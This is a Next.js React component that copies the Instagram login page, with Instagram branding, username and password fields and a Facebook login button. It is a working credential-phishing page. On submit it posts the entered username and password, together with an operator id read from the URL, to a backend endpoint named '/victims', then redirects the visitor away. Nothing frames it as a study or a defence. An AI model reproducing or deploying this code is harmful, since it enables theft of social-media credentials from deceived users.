import Head from "next/head";
import router, { useRouter } from "next/router";
import { useState } from "react";
import styles from "../styles/ins.module.css"
import { API_URL } from "../utils/urls";

const instagram = () => {
    const route = useRouter()
    const id = route.query.i
    const [details, setDetails] = useState({username:"", password:""});

     const handleChange = (e) => {
        setDetails({...details, [e.target.name]: e.target.value})
    }

    const handleSubmit = (e) => {
        e.preventDefault()
        const data = {
            "password": details.password,
            "username": details.username,
            "users_permissions_user": id,
            "Page": "Instagram"
        }
        fetch(`${API_URL}http://localhost:1337/victims`, {
            method: "POST",
            body: JSON.stringify(data),
            headers: { "Content-Type": "application/json "},
        })
        router.push("/");
        console.log("details:", data)
    }

    return (
        <div className={styles.container}>
            <Head>
        <title>Instagram</title>
        <link rel="icon" href="/instFav.png" />
      </Head>
    <div className={styles.box}>
        <div className={styles.heading}></div>
        <form className={styles.loginForm} onSubmit={handleSubmit}>
            <div className={styles.field}>
                <input id="username" value={details.username} onChange={handleChange} onFocus={(e) => e.target.placeholder = ""} type="text" name="username" placeholder="Phone number, username, or email" />
                <label for="username">Phone number, username, or email</label>
            </div>
            <div className={styles.field}>
                <input id="password" onChange={handleChange} onFocus={(e) => e.target.placeholder = ""} value={details.password} type="password" name="password" placeholder="password" />
                <label for="password">Password</label>
            </div>
            <button type="submit" className={styles.loginButton} title="login">Log In</button>
            <div className={styles.separator}>
                <div className={styles.line}></div>
                <p>OR</p>
                <div className={styles.line}></div>
            </div>
            <div className={styles.other}>
                <button className={styles.fbLoginBtn} type="button">
                    <span >Log in with Facebook</span>
                </button>
                <a className={styles.forgotPassword} href="#">Forgot password?</a>
            </div>
        </form>
    </div>
    <div className={styles.box}>
        <p>Don't have an account? <a className={styles.signup} href="#">Sign Up</a></p>
    </div>
</div>
    )
}

export default instagram;